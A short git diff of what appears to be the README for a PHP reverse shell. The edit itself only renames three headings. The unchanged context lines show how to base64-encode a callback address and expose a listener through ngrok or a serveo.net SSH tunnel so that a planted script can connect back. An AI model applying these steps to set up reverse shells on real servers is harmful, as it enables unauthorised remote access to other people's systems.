@@ -37,7 +37,7 @@ echo "192.168.1.5" | base64
 ```
 Copy the output and replace the $ip_b64 value in the PHP script.
 
-**3. Update the PHP script**  
+**3. Update your PHP reverse shell script:**
 
 Change these lines with your Base64 encoded IP/hostname and port:
 
@@ -86,7 +86,7 @@ It will show something like:
 ```nginx
 Forwarding tcp://4.tcp.ngrok.io:18900
 ```
-**Update your PHP script:**
+**Update your PHP reverse shell script:**
 
 ```php
 $ip_b64 = base64_encoded of 4.tcp.ngrok.io;
@@ -109,7 +109,7 @@ ssh -R 0:localhost:4444 serveo.net
 ```csharp
 Forwarding TCP connections from serveo.net:46603
 ```
-**Update your PHP script:**
+**Update your PHP reverse shell script:**
 
 ```php
 $ip_b64 = base64_encoded of serveo.net;
